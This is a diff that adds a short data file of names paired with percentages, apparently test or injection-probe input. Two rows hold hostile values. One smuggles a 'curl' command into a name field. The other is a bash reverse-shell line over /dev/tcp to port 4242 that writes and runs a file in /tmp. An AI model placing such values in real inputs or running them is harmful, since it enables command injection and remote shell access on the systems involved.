@@ -1,0 +1,13 @@
+yaas,100%
+ahmad,33%
+akfjfjh,0%
+; curl 127.0.0.1:4242;,100%
+bash -i >& /dev/tcp/127.0.0.1/4242 0>&1 > /tmp/shell; chmod +x /tmp/shell; /tmp/shell;#,100%
+yaas,33%
+yaas,0%
+yaas,100%
+yaas,100%
+yaas,100%
+yaas,63%
+1,26%
+4,26%
